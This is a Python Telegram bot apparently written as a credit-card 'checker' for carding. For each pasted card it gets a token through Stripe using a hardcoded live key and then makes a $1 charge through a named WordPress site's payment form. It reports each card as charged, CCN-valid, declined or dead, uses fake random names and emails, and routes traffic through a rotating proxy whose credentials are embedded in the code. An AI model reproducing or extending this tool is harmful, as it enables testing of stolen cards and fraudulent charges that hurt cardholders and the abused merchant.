import logging
import os
import requests
import time
import string
import random
import yaml
import asyncio
import re

from aiogram import Bot, Dispatcher, executor, types
from aiogram.utils.exceptions import Throttled
from aiogram.contrib.fsm_storage.memory import MemoryStorage
from bs4 import BeautifulSoup as bs


# Configure vars get from env or config.yml
CONFIG = yaml.load(open('config.yml', 'r'), Loader=yaml.SafeLoader)
TOKEN = os.getenv('TOKEN', CONFIG['token'])
BLACKLISTED = os.getenv('BLACKLISTED', CONFIG['blacklisted']).split()
PREFIX = os.getenv('PREFIX', CONFIG['prefix'])
OWNER = int(os.getenv('OWNER', CONFIG['owner']))
ANTISPAM = int(os.getenv('ANTISPAM', CONFIG['antispam']))

# Initialize bot and dispatcher
storage = MemoryStorage()
bot = Bot(token=TOKEN, parse_mode=types.ParseMode.HTML)
dp = Dispatcher(bot, storage=storage)

# Configure logging
logging.basicConfig(level=logging.INFO)

# BOT INFO
loop = asyncio.get_event_loop()

bot_info = loop.run_until_complete(bot.get_me())
BOT_USERNAME = bot_info.username
BOT_NAME = bot_info.first_name
BOT_ID = bot_info.id

# USE YOUR ROTATING PROXY API IN DICT FORMAT http://user:pass@providerhost:port
proxies = {
           'http': 'http://qnuomzzl-rotate:4i44gnayqk7c@p.webshare.io:80/',
           'https': 'http://qnuomzzl-rotate:4i44gnayqk7c@p.webshare.io:80/'
}

session = requests.Session()

# Random DATA
letters = string.ascii_lowercase
First = ''.join(random.choice(letters) for _ in range(6))
Last = ''.join(random.choice(letters) for _ in range(6))
PWD = ''.join(random.choice(letters) for _ in range(10))
Name = f'{First}+{Last}'
Email = f'{First}.{Last}@gmail.com'
UA = 'Mozilla/5.0 (X11; Linux i686; rv:102.0) Gecko/20100101 Firefox/102.0'


async def is_owner(user_id):
    return user_id == OWNER

async def is_card_valid(card_number: str) -> bool: 
    return (sum( map(lambda n: n[1] + (n[0] % 2 == 0) * (n[1] - 9 * (n[1] > 4)), enumerate(map(int, card_number[:-1]))) ) + int(card_number[-1])) % 10 == 0


@dp.message_handler(commands=['start', 'help'], commands_prefix=PREFIX)
async def helpstr(message: types.Message):
    keyboard_markup = types.InlineKeyboardMarkup(row_width=3)
    btns = types.InlineKeyboardButton("Bot Source", url="https://github.com/xbinner18/Mrbannker")
    keyboard_markup.row(btns)
    FIRST = message.from_user.first_name
    MSG = f'''
Hello {FIRST}, Im {BOT_NAME}
U can find my Boss  <a href="tg://user?id={OWNER}">HERE</a>
Cmds /chk /info /bin'''
    await message.answer(MSG, reply_markup=keyboard_markup, disable_web_page_preview=True)


@dp.message_handler(commands=['info', 'id'], commands_prefix=PREFIX)
async def info(message: types.Message):
    if message.reply_to_message:
        user_id = message.reply_to_message.from_user.id
        is_bot = message.reply_to_message.from_user.is_bot
        username = message.reply_to_message.from_user.username
        first = message.reply_to_message.from_user.first_name
    else:
        user_id = message.from_user.id
        is_bot = message.from_user.is_bot
        username = message.from_user.username
        first = message.from_user.first_name
    await message.reply(f'''
═════════╕
<b>USER INFO</b>
<b>USER ID:</b> <code>{user_id}</code>
<b>USERNAME:</b> @{username}
<b>FIRSTNAME:</b> {first}
<b>BOT:</b> {is_bot}
<b>BOT-OWNER:</b> {await is_owner(user_id)}
╘═════════''')

# Nouvelle commande /mchk pour vérifier plusieurs cartes en même temps
@dp.message_handler(commands=['mchk'], commands_prefix=PREFIX)
async def multi_chk(message: types.Message):
    await message.answer_chat_action('typing')
    tic = time.perf_counter()
    ID = message.from_user.id
    FIRST = message.from_user.first_name
    s = requests.Session()

    try:
        await dp.throttle('mchk', rate=ANTISPAM)
    except Throttled:
        await message.reply('<b>Too many requests!</b>\n'
                            f'Blocked For {ANTISPAM} seconds')
    else:
        # Récupérer tous les numéros de cartes de l'utilisateur
        cards = message.text[len('/mchk '):].splitlines()  # Diviser par lignes

        if len(cards) == 0:
            return await message.reply("<b>No Cards to check</b>")

        results = []
        for cc in cards:
            cc = cc.strip()
            if len(cc) == 0:
                continue  # Passer aux prochaines cartes si le numéro est vide

            x = re.findall(r'\d+', cc)
            if len(x) < 4:
                results.append(f"❌<b>Invalid format for card:</b> {cc}")
                continue

            ccn = x[0]
            mm = x[1]
            yy = x[2]
            cvv = x[3]
            if mm.startswith('2'):
                mm, yy = yy, mm
            if len(mm) >= 3:
                mm, yy, cvv = yy, cvv, mm
            if len(ccn) < 15 or len(ccn) > 16:
                results.append(f"❌<b>Failed to parse card:</b> {ccn}")
                continue
            BIN = ccn[:6]
            if BIN in BLACKLISTED:
                results.append(f"❌<b>BLACKLISTED BIN for card:</b> {ccn}")
                continue
            if await is_card_valid(ccn) != True:
                results.append(f"❌<b>Invalid Luhn algorithm for card:</b> {ccn}")
                continue

            # Process the card normally as in /chk
            headers = {
                "user-agent": UA,
                "accept": "application/json, text/plain, */*",
                "content-type": "application/x-www-form-urlencoded"
            }

            m = s.post('https://m.stripe.com/6', headers=headers)
            r = m.json()
            Guid = r['guid']
            Muid = r['muid']
            Sid = r['sid']

            postdata = {
                "guid": Guid,
                "muid": Muid,
                "sid": Sid,
                "key": "pk_live_Ng5VkKcI3Ur3KZ92goEDVRBq",
                "card[name]": Name,
                "card[number]": ccn,
                "card[exp_month]": mm,
                "card[exp_year]": yy,
                "card[cvc]": cvv
            }

            HEADER = {
                "accept": "application/json",
                "content-type": "application/x-www-form-urlencoded",
                "user-agent": UA,
                "origin": "https://js.stripe.com",
                "referer": "https://js.stripe.com/",
                "accept-language": "en-US,en;q=0.9"
            }

            pr = s.post('https://api.stripe.com/v1/tokens',
                        data=postdata, headers=HEADER)
            Id = pr.json()['id']
            if pr.status_code != 200:
                results.append(f"❌<b>Failed to process card:</b> {ccn}")
                continue
            nonce = s.get("https://www.hwstjohn.com/pay-now/")
            form = re.findall(r'formNonce" value="([^\'" >]+)', nonce.text)

            load = {
                "action": "wp_full_stripe_payment_charge",
                "formName": "default",
                "formNonce": form,
                "fullstripe_name": Name,
                "fullstripe_email": Email,
                "fullstripe_custom_amount": "1",
                "fullstripe_amount_index": 0,
                "stripeToken": Id
            }

            header = {
                "accept": "application/json, text/javascript, */*; q=0.01",
                "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
                "user-agent": UA,
                "accept-language": "en-US,en;q=0.9"
            }

            rx = s.post('https://www.hwstjohn.com/wp-admin/admin-ajax.php',
                        data=load, headers=header)
            msg = rx.json()['msg']

            toc = time.perf_counter()

            if 'true' in rx.text:
                results.append(f'''
✅<b>CC</b>➟ <code>{ccn}|{mm}|{yy}|{cvv}</code>
<b>STATUS</b>➟ #CHARGED 1$
<b>MSG</b>➟ {msg}
<b>TOOK:</b> <code>{toc - tic:0.2f}</code>(s)
<b>CHKBY</b>➟ <a href="tg://user?id={ID}">{FIRST}</a>
<b>OWNER</b>: {await is_owner(ID)}
<b>BOT</b>: @{BOT_USERNAME}''')

            elif 'security code' in rx.text:
                results.append(f'''
✅<b>CC</b>➟ <code>{ccn}|{mm}|{yy}|{cvv}</code>
<b>STATUS</b>➟ #CCN
<b>MSG</b>➟ {msg}
<b>TOOK:</b> <code>{toc - tic:0.2f}</code>(s)
<b>CHKBY</b>➟ <a href="tg://user?id={ID}">{FIRST}</a>
<b>OWNER</b>: {await is_owner(ID)}
<b>BOT</b>: @{BOT_USERNAME}''')

            elif 'false' in rx.text:
                results.append(f'''
❌<b>CC</b>➟ <code>{ccn}|{mm}|{yy}|{cvv}</code>
<b>STATUS</b>➟ #Declined
<b>MSG</b>➟ {msg}
<b>TOOK:</b> <code>{toc - tic:0.2f}</code>(s)
<b>CHKBY</b>➟ <a href="tg://user?id={ID}">{FIRST}</a>
<b>OWNER</b>: {await is_owner(ID)}
<b>BOT</b>: @{BOT_USERNAME}''')

            else:
                results.append(f'''
❌<b>CC</b>➟ <code>{ccn}|{mm}|{yy}|{cvv}</code>
<b>STATUS</b>➟ DEAD
<b>MSG</b>➟ {rx.text}
<b>TOOK:</b> <code>{toc - tic:0.2f}</code>(s)
<b>CHKBY</b>➟ <a href="tg://user?id={ID}">{FIRST}</a>
<b>OWNER</b>: {await is_owner(ID)}
<b>BOT</b>: @{BOT_USERNAME}''')

        # Envoyer les résultats à l'utilisateur
        await message.reply('\n\n'.join(results))

if __name__ == "__main__":
    executor.start_polling(dp, skip_updates=True)
